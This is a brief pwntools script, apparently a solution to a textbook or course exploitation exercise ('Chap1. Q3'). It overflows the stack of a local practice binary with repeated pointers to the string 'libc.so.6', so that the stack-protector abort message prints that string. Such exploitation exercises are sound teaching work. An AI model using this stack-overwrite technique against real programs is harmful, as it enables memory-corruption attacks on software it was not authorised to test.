#!/usr/bin/python -i

# answer to Chap1. Q3

from pwn import *

r = process('./sayhello_sc')
#gdb.attach(r)

p = ''
# $ strings --radix=x sayhello_sc
p += p64(0x400361) * 34  # libc.so.6

r.sendline(p)

r.interactive()

# *** stack smashing detected ***: libc.so.6 terminated

# The filename pointer can be any string in memory, libc.so.6 being the funniest :)
